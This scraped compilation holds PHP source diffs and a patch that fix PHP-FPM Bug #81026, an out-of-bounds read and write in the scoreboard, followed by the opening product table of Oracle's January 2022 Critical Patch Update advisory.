|  |  | if (scoreboard->procs[i] && !scoreboard->procs[i]->used) { /\* found \*/ |
|  |  | for (i = 0; i < nprocs; i++) { |
|  |  | if (!scoreboard->procs[i].used) { /\* found \*/ |
|  |  | break; |
|  |  | } |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | /\* no free slot \*/ |
|  |  | if (i < 0 || i >= (int)scoreboard->nprocs) { |
|  |  | if (i < 0 || i >= nprocs) { |
|  |  | zlog(ZLOG\_ERROR, "[pool %s] no free scoreboard slot", scoreboard->pool); |
|  |  | return -1; |
|  |  | } |
|  |  |  |
|  |  | scoreboard->procs[i]->used = 1; |
|  |  | \*child\_index = i; |
|  |  | scoreboard->procs[i].used = 1; |
|  |  | child->scoreboard\_i = i; |
|  |  |  |
|  |  | /\* supposed next slot is free \*/ |
|  |  | if (i + 1 >= (int)scoreboard->nprocs) { |
|  |  | if (i + 1 >= nprocs) { |
|  |  | scoreboard->free\_proc = 0; |
|  |  | } else { |
|  |  | scoreboard->free\_proc = i + 1; |
| Expand Down | |  |

11 changes: 6 additions & 5 deletions

11
[sapi/fpm/fpm/fpm\_scoreboard.h](#diff-6973e7a71e7238efe84f48f3db2c0f9d2d602b9822e89fab5a835ac3d34acf23 "sapi/fpm/fpm/fpm_scoreboard.h")

Show comments

[View file](/php/php-src/blob/fadb1f8c1d08ae62b4f0a16917040fde57a3b93b/sapi/fpm/fpm/fpm_scoreboard.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -64,7 +64,7 @@ struct fpm\_scoreboard\_s { |
|  |  | int free\_proc; |
|  |  | unsigned long int slow\_rq; |
|  |  | struct fpm\_scoreboard\_s \*shared; |
|  |  | struct fpm\_scoreboard\_proc\_s \*procs[]; |
|  |  | struct fpm\_scoreboard\_proc\_s procs[]; |
|  |  | }; |
|  |  |  |
|  |  | int fpm\_scoreboard\_init\_main(); |
| Expand All | | @@ -73,18 +73,19 @@ int fpm\_scoreboard\_init\_child(struct fpm\_worker\_pool\_s \*wp); |
|  |  | void fpm\_scoreboard\_update(int idle, int active, int lq, int lq\_len, int requests, int max\_children\_reached, int slow\_rq, int action, struct fpm\_scoreboard\_s \*scoreboard); |
|  |  | struct fpm\_scoreboard\_s \*fpm\_scoreboard\_get(); |
|  |  | struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get(struct fpm\_scoreboard\_s \*scoreboard, int child\_index); |
|  |  | struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get\_from\_child(struct fpm\_child\_s \*child); |
|  |  |  |
|  |  | struct fpm\_scoreboard\_s \*fpm\_scoreboard\_acquire(struct fpm\_scoreboard\_s \*scoreboard, int nohang); |
|  |  | void fpm\_scoreboard\_release(struct fpm\_scoreboard\_s \*scoreboard); |
|  |  | struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_acquire(struct fpm\_scoreboard\_s \*scoreboard, int child\_index, int nohang); |
|  |  | void fpm\_scoreboard\_proc\_release(struct fpm\_scoreboard\_proc\_s \*proc); |
|  |  |  |
|  |  | void fpm\_scoreboard\_free(struct fpm\_scoreboard\_s \*scoreboard); |
|  |  | void fpm\_scoreboard\_free(struct fpm\_worker\_pool\_s \*wp); |
|  |  |  |
|  |  | void fpm\_scoreboard\_child\_use(struct fpm\_scoreboard\_s \*scoreboard, int child\_index, pid\_t pid); |
|  |  | void fpm\_scoreboard\_child\_use(struct fpm\_child\_s \*child, pid\_t pid); |
|  |  |  |
|  |  | void fpm\_scoreboard\_proc\_free(struct fpm\_scoreboard\_s \*scoreboard, int child\_index); |
|  |  | int fpm\_scoreboard\_proc\_alloc(struct fpm\_scoreboard\_s \*scoreboard, int \*child\_index); |
|  |  | void fpm\_scoreboard\_proc\_free(struct fpm\_child\_s \*child); |
|  |  | int fpm\_scoreboard\_proc\_alloc(struct fpm\_child\_s \*child); |
|  |  |  |
|  |  | #ifdef HAVE\_TIMES |
|  |  | float fpm\_scoreboard\_get\_tick(); |
| Expand Down | |  |

4 changes: 2 additions & 2 deletions

4
[sapi/fpm/fpm/fpm\_status.c](#diff-838af21e79da4e7bd0e5c8a70aff09feda8066550d75c8fb1a6e9db674e431b5 "sapi/fpm/fpm/fpm_status.c")

Show comments

[View file](/php/php-src/blob/fadb1f8c1d08ae62b4f0a16917040fde57a3b93b/sapi/fpm/fpm/fpm_status.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -472,10 +472,10 @@ int fpm\_status\_handle\_request(void) /\* {{{ \*/ |
|  |  |  |
|  |  | first = 1; |
|  |  | for (i=0; i<scoreboard\_p->nprocs; i++) { |
|  |  | if (!scoreboard\_p->procs[i] || !scoreboard\_p->procs[i]->used) { |
|  |  | if (!scoreboard\_p->procs[i].used) { |
|  |  | continue; |
|  |  | } |
|  |  | proc = \*scoreboard\_p->procs[i]; |
|  |  | proc = scoreboard\_p->procs[i]; |
|  |  |  |
|  |  | if (first) { |
|  |  | first = 0; |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[sapi/fpm/fpm/fpm\_worker\_pool.c](#diff-3ed2a6a89d2e60c82de36155bb1e27aba222471c5721a0c0c4322b88ee08ac42 "sapi/fpm/fpm/fpm_worker_pool.c")

Show comments

[View file](/php/php-src/blob/fadb1f8c1d08ae62b4f0a16917040fde57a3b93b/sapi/fpm/fpm/fpm_worker_pool.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -54,7 +54,7 @@ static void fpm\_worker\_pool\_cleanup(int which, void \*arg) /\* {{{ \*/ |
|  |  | fpm\_worker\_pool\_config\_free(wp->config); |
|  |  | fpm\_children\_free(wp->children); |
|  |  | if ((which & FPM\_CLEANUP\_CHILD) == 0 && fpm\_globals.parent\_pid == getpid()) { |
|  |  | fpm\_scoreboard\_free(wp->scoreboard); |
|  |  | fpm\_scoreboard\_free(wp); |
|  |  | } |
|  |  | fpm\_worker\_pool\_free(wp); |
|  |  | } |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `fadb1f8`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2Ffadb1f8c1d08ae62b4f0a16917040fde57a3b93b) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from bugs.php.net_ef919fcc_20250115_115349.html ===


| [Bugs](/) | [php.net](https://php.net/) |  [support](https://php.net/support.php) |  [documentation](https://php.net/docs.php) |  [report a bug](report.php) |  [advanced search](search.php) |  [search howto](search-howto.php) |  [statistics](stats.php) |  [random bug](random) |  [login](login.php) |
| --- | --- |
| go to bug id or search bugs for | |

| | [Return to Bug #81026](bug.php?id=81026) | | --- | | Patch [fpm\_scoreboard\_proc\_oob\_fix\_v4.patch](patch-display.php?bug_id=81026&patch=fpm_scoreboard_proc_oob_fix_v4.patch&revision=latest) | revision [2021-10-10 19:20 UTC](patch-display.php?bug_id=81026&patch=fpm_scoreboard_proc_oob_fix_v4.patch&revision=1633893616&display=1) by bukka@php.net | | Patch [fmp\_scoreboard\_proc\_oob\_v3.patch](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v3.patch&revision=latest) | revision [2021-05-31 21:55 UTC](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v3.patch&revision=1622498128&display=1) by bukka@php.net | | Patch [fmp\_scoreboard\_proc\_oob\_v2.patch](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v2.patch&revision=latest) | revision [2021-05-31 21:16 UTC](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v2.patch&revision=1622495810&display=1) by bukka@php.net | | Patch [fmp\_scoreboard\_proc\_oob\_v1.patch](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v1.patch&revision=latest) | revision [2021-05-31 13:32 UTC](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v1.patch&revision=1622467931&display=1) by bukka@php.net |  Patch fmp\_scoreboard\_proc\_oob\_v1.patch for FPM related Bug #81026 **Patch version 2021-05-31 13:32 UTC** [Return to Bug #81026](bug.php?id=81026) | [Download this patch](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v1.patch&revision=1622467931&download=1) Patch Revisions:  * [2021-05-31 13:32 UTC](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v1.patch&revision=1622467931) [[diff to current]](patch-display.php?patch=fmp_scoreboard_proc_oob_v1.patch&bug_id=81026&diff=1&old=1622467931&revision=1622467931)  Developer: bukka@php.net ```  From 61f3c6e4461975f3b24b96a998c7ce789534d0f5 Mon Sep 17 00:00:00 2001 From: Jakub Zelenka <bukka@php.net> Date: Mon, 31 May 2021 14:26:09 +0100 Subject: [PATCH] Fix bug #81026 (PHP-FPM oob R/W in root process leading to  privilege escalation)  ---  sapi/fpm/fpm/fpm_request.c    |  6 +++---  sapi/fpm/fpm/fpm_scoreboard.c | 35 +++++++++++++++++++++++++++++++++++  sapi/fpm/fpm/fpm_scoreboard.h |  2 ++  3 files changed, 40 insertions(+), 3 deletions(-)  diff --git a/sapi/fpm/fpm/fpm_request.c b/sapi/fpm/fpm/fpm_request.c index 83401f1553..540949b026 100644 --- a/sapi/fpm/fpm/fpm_request.c +++ b/sapi/fpm/fpm/fpm_request.c @@ -227,7 +227,7 @@ void fpm_request_check_timed_out(struct fpm_child_s *child, struct timeval *now,  {  	struct fpm_scoreboard_proc_s proc, *proc_p;   -	proc_p = fpm_scoreboard_proc_acquire(child->wp->scoreboard, child->scoreboard_i, 1); +	proc_p = fpm_scoreboard_proc_acquire_from_child(child, 1);  	if (!proc_p) {  		zlog(ZLOG_WARNING, "failed to acquire scoreboard");  		return; @@ -287,7 +287,7 @@ int fpm_request_is_idle(struct fpm_child_s *child) /* {{{ */  	struct fpm_scoreboard_proc_s *proc;    	/* no need in atomicity here */ -	proc = fpm_scoreboard_proc_get(child->wp->scoreboard, child->scoreboard_i); +	proc = fpm_scoreboard_proc_get_from_child(child);  	if (!proc) {  		return 0;  	} @@ -302,7 +302,7 @@ int fpm_request_last_activity(struct fpm_child_s *child, struct timeval *tv) /*    	if (!tv) return -1;   -	proc = fpm_scoreboard_proc_get(child->wp->scoreboard, child->scoreboard_i); +	proc = fpm_scoreboard_proc_get_from_child(child);  	if (!proc) {  		return -1;  	} diff --git a/sapi/fpm/fpm/fpm_scoreboard.c b/sapi/fpm/fpm/fpm_scoreboard.c index 328f999f0c..b26e503f9c 100644 --- a/sapi/fpm/fpm/fpm_scoreboard.c +++ b/sapi/fpm/fpm/fpm_scoreboard.c @@ -6,6 +6,7 @@  #include <time.h>    #include "fpm_config.h" +#include "fpm_children.h"  #include "fpm_scoreboard.h"  #include "fpm_shm.h"  #include "fpm_sockets.h" @@ -184,6 +185,23 @@ struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_get(struct fpm_scoreboard_s *s  }  /* }}} */   +struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_get_from_child(struct fpm_child_s *child) /* {{{*/ +{ +	struct fpm_worker_pool_s *wp = child->wp; +	struct fpm_scoreboard_proc_s *proc = fpm_scoreboard_proc_get(wp->scoreboard, child->scoreboard_i); +	ptrdiff_t proc_start = (uintptr_t) wp->scoreboard + sizeof(struct fpm_scoreboard_s); +	ptrdiff_t proc_end = sizeof(struct fpm_scoreboard_s) + (wp->config->pm_max_children - 1) * sizeof(struct fpm_scoreboard_proc_s *); +	uintptr_t proc_position = (uintptr_t) proc; + +	if (proc_position < proc_start || proc_position > proc_end) { +		zlog(ZLOG_WARNING, "failed to get proc from the child scoreboard because the proc pointer is invalid"); +		return NULL; +	} + +	return proc; +} +/* }}} */ +  struct fpm_scoreboard_s *fpm_scoreboard_acquire(struct fpm_scoreboard_s *scoreboard, int nohang) /* {{{ */  {  	struct fpm_scoreboard_s *s; @@ -225,6 +243,23 @@ struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_acquire(struct fpm_scoreboard_  }  /* }}} */   +struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_acquire_from_child(struct fpm_child_s *child, int nohang) /* {{{ */ +{ +	struct fpm_scoreboard_proc_s *proc; + +	proc = fpm_scoreboard_proc_get_from_child(child); +	if (!proc) { +		return NULL; +	} + +	if (!fpm_spinlock(&proc->lock, nohang)) { +		return NULL; +	} + +	return proc; +} +/* }}} */ +  void fpm_scoreboard_proc_release(struct fpm_scoreboard_proc_s *proc) /* {{{ */  {  	if (!proc) { diff --git a/sapi/fpm/fpm/fpm_scoreboard.h b/sapi/fpm/fpm/fpm_scoreboard.h index 1fecde1d0f..ff7ed1806d 100644 --- a/sapi/fpm/fpm/fpm_scoreboard.h +++ b/sapi/fpm/fpm/fpm_scoreboard.h @@ -72,10 +72,12 @@ int fpm_scoreboard_init_child(struct fpm_worker_pool_s *wp);  void fpm_scoreboard_update(int idle, int active, int lq, int lq_len, int requests, int max_children_reached, int slow_rq, int action, struct fpm_scoreboard_s *scoreboard);  struct fpm_scoreboard_s *fpm_scoreboard_get();  struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_get(struct fpm_scoreboard_s *scoreboard, int child_index); +struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_get_from_child(struct fpm_child_s *child);    struct fpm_scoreboard_s *fpm_scoreboard_acquire(struct fpm_scoreboard_s *scoreboard, int nohang);  void fpm_scoreboard_release(struct fpm_scoreboard_s *scoreboard);  struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_acquire(struct fpm_scoreboard_s *scoreboard, int child_index, int nohang); +struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_acquire_from_child(struct fpm_child_s *child, int nohang);  void fpm_scoreboard_proc_release(struct fpm_scoreboard_proc_s *proc);    void fpm_scoreboard_free(struct fpm_scoreboard_s *scoreboard); --  2.25.1   ``` |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

|  | |
| --- | --- |
| [PHP](https://php.net/) [Copyright © 2001-2025 The PHP Group](https://php.net/copyright.php) All rights reserved. | Last updated: Wed Jan 15 11:01:31 2025 UTC |



=== Content from www.oracle.com_cd95aeb5_20250114_195340.html ===


* [Skip to content](#maincontent)
* [Accessibility Policy](https://www.oracle.com/corporate/accessibility/)

Products
Industries
Resources
Customers
Partners
Developers
Company

Close Search

Search Oracle.com

* QUICK LINKS
* [Oracle Cloud Infrastructure](/cloud/)
* [Oracle Fusion Cloud Applications](/applications/)
* [Oracle Database](/database/technologies/)
* [Download Java](/java/technologies/downloads/)
* [Careers at Oracle](/careers/)

Search

[Country
![]()](/countries-list.html#countries)

View Accounts

Back
Cloud Account
[Sign in to Cloud](/cloud/sign-in.html)
[Sign Up for Free Cloud Tier](/cloud/free/)

Oracle Account

* [Sign-In](https://www.oracle.com/webapps/redirect/signon?nexturl=)
* [Create an Account](https://profile.oracle.com/myprofile/account/create-account.jspx)

* [Help](/corporate/contact/help.html)
* Sign Out

[Contact Sales](/corporate/contact/ "Contact Sales")

[Menu

Menu](/global-menu-v2/)

## Oracle Critical Patch Update Advisory - January 2022

### Description

A Critical Patch Update is a collection of patches for multiple security vulnerabilities.  These patches address vulnerabilities in Oracle code and in third-party components included in Oracle products.  These patches are usually cumulative, but each advisory describes only the security patches added since the previous Critical Patch Update Advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security patches.  Refer to [“Critical Patch Updates, Security Alerts and Bulletins”](https://www.oracle.com/security-alerts/) for information about Oracle Security advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released security patches. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore strongly recommends that customers remain on actively-supported versions and apply Critical Patch Update security patches without delay.**

This Critical Patch Update contains 497 new security patches across the product families listed below. Please note that an MOS note summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at  [January 2022 Critical Patch Update: Executive Summary and Analysis](https://support.oracle.com/rs?type=doc&id=2832416.1).

**Please note that on December 10, 2021, Oracle released a Security Alert for Apache Log4j vulnerabilities [CVE-2021-44228 and CVE-2021-45046](https://www.oracle.com/security-alerts/alert-cve-2021-44228.html). Customers should review the Alert if they have not already done so.**

### Affected Products and Patch Information

Security vulnerabilities addressed by this Critical Patch Update affect the products listed below. The product area is shown in the Patch Availability Document column.

**Please click on the links in the Patch Availability Document column below to access the documentation for patch availability information and installation instructions.**

| Affected Products and Versions | Patch Availability Document |
| --- | --- |
| [Agile Product Lifecycle Management Integration Pack for Oracle E-Business Suite, version 3.6](#AppendixSCP) | [Oracle Supply Chain Products](https://support.oracle.com/rs?type=doc&id=2832006.1) |
| [Application Performance Management, versions 13.4.1.0, 13.5.1.0](#AppendixEM) | [Enterprise Manager](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Big Data Spatial and Graph, versions prior to 23.1](#AppendixBGDG) | [Database](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Enterprise Manager Base Platform, versions 13.4.0.0, 13.5.0.0](#AppendixEM) | [Enterprise Manager](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Enterprise Manager Ops Center, version 12.4.0.0](#AppendixEM) | [Enterprise Manager](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Fujitsu M10-1, M10-4, M10-4S, M12-1, M12-2, M12-2S Servers, versions prior to XCP2410, prior to XCP3110](#AppendixSUNS) | [Systems](https://support.oracle.com/rs?type=doc&id=2832878.1) |
| [Instantis EnterpriseTrack, versions 17.1, 17.2, 17.3](#AppendixPVA) | [Oracle Construction and Engineering Suite](https://support.oracle.com/rs?type=doc&id=2829871.1) |
| [JD Edwards EnterpriseOne Tools, versions prior to 9.2.6.1](#AppendixJDE) | [JD Edwards](https://support.oracle.com/rs?type=doc&id=2832004.1) |
| [MySQL Cluster, versions 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior](#AppendixMSQL) | [MySQL](https://support.oracle.com/rs?type=doc&id=2832117.1) |
| [MySQL Connectors, versions 8.0.27 and prior](#AppendixMSQL) | [MySQL](https://support.oracle.com/rs?type=doc&id=2832117.1) |
| [MySQL Server, versions 5.7.36 and prior, 8.0.27 and prior](#AppendixMSQL) | [MySQL](https://support.oracle.com/rs?type=doc&id=2832117.1) |
| [MySQL Workbench, versions 8.0.27 and prior](#AppendixMSQL) | [MySQL](https://support.oracle.com/rs?type=doc&id=2832117.1) |
| [Oracle Access Manager, versions 11.1.2.3.0, 12.2.1.3.0, 12.2.1.4.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Oracle Agile Engineering Data Management, version 6.2.1.0](#AppendixSCP) | [Oracle Supply Chain Products](https://support.oracle.com/rs?type=doc&id=2832006.1) |
| [Oracle Agile PLM, versions 9.3.3, 9.3.6](#AppendixSCP) | [Oracle Supply Chain Products](https://support.oracle.com/rs?type=doc&id=2832006.1) |
| [Oracle Agile PLM MCAD Connector, versions 3.4, 3.6](#AppendixSCP) | [Oracle Supply Chain Products](https://support.oracle.com/rs?type=doc&id=2832006.1) |
| [Oracle Airlines Data Model, versions 12.1.1.0.0, 12.2.0.1.0](#AppendixADM) | [Oracle Airlines Data Model](https://support.oracle.com/rs?type=doc&id=2833257.1) |
| [Oracle Application Express, versions prior to 21.1.4](#AppendixDB) | [Database](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Oracle Application Testing Suite, version 13.3.0.1](#AppendixEM) | [Enterprise Manager](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Oracle Argus Analytics, versions 8.2.1, 8.2.2, 8.2.3](#AppendixHCAR) | [Health Sciences](https://support.oracle.com/rs?type=doc&id=2827314.1) |
| [Oracle Argus Insight, versions 8.2.1, 8.2.2, 8.2.3](#AppendixHCAR) | [Health Sciences](https://support.oracle.com/rs?type=doc&id=2827314.1) |
| [Oracle Argus Mart, versions 8.2.1, 8.2.2, 8.2.3](#AppendixHCAR) | [Health Sciences](https://support.oracle.com/rs?type=doc&id=2827314.1) |
| [Oracle Argus Safety, versions 8.2.1, 8.2.2, 8.2.3](#AppendixHCAR) | [Health Sciences](https://support.oracle.com/rs?type=doc&id=2827314.1) |
| [Oracle Banking APIs, versions 18.1-18.3, 19.1, 19.2, 20.1, 21.1](#AppendixIFLX) | [Contact Support](https://support.oracle.com) |
| [Oracle Banking Deposits and Lines of Credit Servicing, version 2.12.0](#AppendixIFLX) | [Contact Support](https://support.oracle.com) |
| [Oracle Banking Digital Experience, versions 17.2, 18.1-18.3, 19.1, 19.2, 20.1, 21.1](#AppendixIFLX) | [Contact Support](https://support.oracle.com) |
| [Oracle Banking Enterprise Default Management, versions 2.3.0-2.4.1, 2.6.2, 2.7.0, 2.7.1, 2.10.0, 2.12.0](#AppendixIFLX) | [Oracle Banking Platform](https://support.oracle.com/rs?type=doc&id=2827842.1) |
| [Oracle Banking Loans Servicing, version 2.12.0](#AppendixIFLX) | [Contact Support](https://support.oracle.com) |
| [Oracle Banking Party Management, version 2.7.0](#AppendixIFLX) | [Oracle Banking Platform](https://support.oracle.com/rs?type=doc&id=2827842.1) |
| [Oracle Banking Platform, versions 2.3.0-2.4.1, 2.6.2, 2.7.0, 2.7.1](#AppendixIFLX) | [Oracle Banking Platform](https://support.oracle.com/rs?type=doc&id=2827842.1) |
| [Oracle BI Publisher, versions 5.5.0.0.0, 11.1.1.9.0, 12.2.1.3.0, 12.2.1.4.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Oracle Business Activity Monitoring, version 12.2.1.4.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Oracle Business Intelligence Enterprise Edition, versions 5.5.0.0.0, 5.9.0.0.0, 12.2.1.3.0, 12.2.1.4.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Oracle Business Process Management Suite, versions 12.2.1.3.0, 12.2.1.4.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2817011.1) |
| [Oracle Clinical, versions 5.2.1, 5.2.2](#AppendixHCAR) | [Health Sciences](https://support.oracle.com/rs?type=doc&id=2827314.1) |
| [Oracle Commerce Guided Search, version 11.3.2](#AppendixOCOM) | [Oracle Commerce](https://support.oracle.com/rs?type=doc&id=2832419.1) |
| [Oracle Commerce Platform, versions 11.3.0, 11.3.1, 11.3.2](#AppendixOCOM) | [Oracle Commerce](https://support.oracle.com/rs?type=doc&id=2832419.1) |
| [Oracle Communications Billing and Revenue Management, versions 12.0.0.3, 12.0.0.4](#AppendixCAGBU) | [Oracle Communications Billing and Revenue Management](https://support.oracle.com/rs?type=doc&id=2831903.1) |
| [Oracle Communications BRM - Elastic Charging Engine, versions 11.3, 12.0](#AppendixCAGBU) | [Oracle Communications BRM - Elastic Charging Engine](https://support.oracle.com/rs?type=doc&id=2831903.1) |
| [Oracle Communications Calendar Server, version 8.0.0.5.0](#AppendixCAGBU) | [Oracle Communications Calendar Server](https://support.oracle.com/rs?type=doc&id=2831902.1) |
| [Oracle Communications Cloud Native Core Automated Test Suite, version 1.8.0](#AppendixCGBU) | [Oracle Communications Cloud Native Core Automated Test Suite](https://support.oracle.com/rs?type=doc&id=2833620.1) |
| [Oracle Communications Cloud Native Core Binding Support Function, versions 1.9.0, 1.10.0](#AppendixCGBU) | [Oracle Communications Cloud Native Core Binding Support Function](https://support.oracle.com/rs?type=doc&id=2833618.1) |
| [Oracle Communications Cloud Native Core Console, version 1.7.0](#AppendixCGBU) | [Communications Cloud Native Core Console](https://support.oracle.com/rs?type=doc&id=2833832.1) |
| [Oracle Communications Cloud Native Core Network Function Cloud Native Environment, version 1.9.0](#AppendixCGBU) | [Oracle Communications Cloud Native Core Network Function Cloud Native Environment](https://support.oracle.com/rs?type=doc&id=2833600.1) |
| [Oracle Communications Cloud Native Core Network Repository Function, version 1.14.0](#AppendixCGBU) | [Oracle Communications Cloud Native Core Network Repository Function](https://support.oracle.com/rs?type=doc&id=2833598.1) |
| [Oracle Communications Cloud Native Core Policy, version 1.14.0](#AppendixCGBU) | [Communications Cloud Native Core Policy](https://support.oracle.com/rs?type=doc&id=2833602.1) |
| [Oracle Communications Cloud Native Core Security Edge Protection Proxy, versions 1.5.0, 1.6.0, 1.15.0](#AppendixCGBU) | [Communications Cloud Native Core Security Edge Protection Proxy](https://support.oracle.com/rs?type=doc&id=2833594.1) |
| [Oracle Communications Cloud Native Core Service Communication Proxy, version 1.14.0](#AppendixCGBU) | [Communications Cloud Native Core Service Communication Proxy](https://support.oracle.com/rs?type=doc&id=2833601.1) |
| [Oracle Communications Cloud Native Core Unified Data Repository, version 1.14.0](#AppendixCGBU) | [Communications Cloud Native Core Unified Data Repository](https://support.oracle.com/rs?type=doc&id=2833596.1) |
| [Oracle Communications Contacts Server, version 8.0.0.3.0](#AppendixCAGBU) | [Oracle Communications Contacts Server](https://support.oracle.com/rs?type=doc&id=2831902.1) |
| [Oracle Communications Convergence, version 3.0.2.2.0](#AppendixCAGBU) | [Oracle Communications Convergence](https://support.oracle.com/rs?type=doc&id=2831902.1) |
| [Oracle Communications Convergent Charging Controller, versions 6.0.1.0.0, 12.0.1.0.0-12.0.4.0.0](#AppendixCAGBU) | [Oracle Communications Convergent Charging Controller](https://support.oracle.com/rs?type=doc&id=2831885.1) |
| [Oracle Communications Data Model, versions 11.3.2.1.0, 11.3.2.2.0, 11.3.2.3.0, 12.1.0.1.0, 12.1.2.0.0](#AppendixCDM) | [Oracle Communications Data Model](https://support.oracle.com/rs?type=doc&id=2833265.1) |
| [Oracle Communications Design Studio, versions 7.3.4, 7.3.5, 7.4.0, 7.4.1, 7.4.2](#AppendixCAGBU) | [Oracle Communications Design Studio](https://support.oracle.com/rs?type=doc&id=2831888.1) |
| [Oracle Communications Diameter Signaling Router, versions 8.0.0.0-8.5.1.0](#AppendixCGBU) | [Oracle Communications Diameter Signaling Router](https://support.oracle.com/rs?type=doc&id=2833215.1) |
| [Oracle Communications EAGLE Application Processor, versions 16.1-16.4](#AppendixCGBU) | [Oracle Communications EAGLE Application Processor](https://support.oracle.com/rs?type=doc&id=2833619.1) |
| [Oracle Communications Instant Messaging Server, version 10.0.1.5.0](#AppendixCAGBU) | [Oracle Communications Instant Messaging Server](https://support.oracle.com/rs?type=doc&id=2831902.1) |
| [Oracle Communications Interactive Session Recorder, versions 6.3, 6.4](#AppendixCGBU) | [Oracle Communications Interactive Session Recorder](https://support.oracle.com/rs?type=doc&id=2833605.1) |
| [Oracle Communications Messaging Server, version 8.1](#AppendixCAGBU) | [Oracle Communications Messaging Server](https://support.oracle.com/rs?type=doc&id=2831902.1) |
| [Oracle Communications Network Charging and Control, versions 6.0.1.0.0, 12.0.1.0.0-12.0.4.0.0](#AppendixCAGBU) | [Oracle Communications Network Charging and Control](https://support.oracle.com/rs?type=doc&id=2831885.1) |
| [Oracle Communications Network Integrity, versions 7.3.5, 7.3.6](#AppendixCAGBU) | [Oracle Communications Network Integrity](https://support.oracle.com/rs?type=doc&id=2831886.1) |
| [Oracle Communications Offline Mediation Controller, version 12.0.0.3](#AppendixCAGBU) | [Oracle Communications Offline Mediation Controller](https://support.oracle.com/rs?type=doc&id=2831903.1) |
| [Oracle Communications Operations Monitor, versions 3.4, 4.2, 4.3, 4.4, 5.0](#AppendixCGBU) | [Oracle Communications Operations Monitor](https://support.oracle.com/rs?type=doc&id=2833603.1) |
| [Oracle Communications Pricing Design Center, versions 12.0.0.3.0, 12.0.0.4.0](#AppendixCAGBU) | [Oracle Communications Pricing Design Center](https://support.oracle.com/rs?type=doc&id=2831903.1) |
| [Oracle Communications Service Broker, version 6.2](#AppendixCGBU) | [Oracle Communications Service Broker](https://support.oracle.com/rs?type=doc&id=2833617.1) |
| [Oracle Communications Services Gatekeeper, version 7.0](#AppendixCGBU) | [Oracle Communications Services Gatekeeper](https://support.oracle.com/rs?type=doc&id=2833211.1) |
| [Oracle Communications Session Border Controller, versions 8.2, 8.3, 8.4, 9.0](#AppendixCGBU) | [Oracle Communications Session Border Controller](https://support.oracle.com/rs?type=doc&id=2833085.1) |
| [Oracle Communications Unified Inventory Management, versions 7.3.0, 7.3.4, 7.3.5, 7.4.0, 7.4.1, 7.4.2, 7.5.0](#AppendixCAGBU) | [Oracle Communications Unified Inventory Management](https://support.oracle.com/rs?type=doc&id=2831889.1) |
